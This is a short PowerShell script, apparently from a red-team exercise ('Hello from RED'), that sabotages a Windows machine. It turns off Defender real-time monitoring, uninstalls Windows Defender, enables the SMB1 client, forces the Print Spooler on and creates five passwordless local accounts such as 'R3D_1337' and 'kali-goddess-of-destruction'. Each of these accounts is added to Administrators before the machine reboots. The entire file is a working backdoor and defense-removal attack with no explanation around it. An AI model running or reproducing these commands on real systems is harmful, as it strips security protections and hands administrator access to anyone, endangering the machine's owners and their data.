Set-MpPreference -DisableRealtimeMonitoring $True
Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
Start-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Automatic
Uninstall-WindowsFeature -Name Windows-Defender
New-LocalUser -Name "R3D_1337" -Description "Hello from RED" -NoPassword
Add-LocalGroupMember -Group "Administrators" -Member "R3D_1337"
New-LocalUser -Name "Mike" -Description "Hello from RED" -NoPassword
Add-LocalGroupMember -Group "Administrators" -Member "Mike"
New-LocalUser -Name "John" -Description "Hello from RED" -NoPassword
Add-LocalGroupMember -Group "Administrators" -Member "John"
New-LocalUser -Name "JohnCena" -Description "Hello from RED" -NoPassword
Add-LocalGroupMember -Group "Administrators" -Member "JohnCena"
New-LocalUser -Name "kali-goddess-of-destruction" -Description "Scorched Earth" -NoPassword
Add-LocalGroupMember -Group "Administrators" -Member "kali-goddess-of-destruction"
Restart-Computer
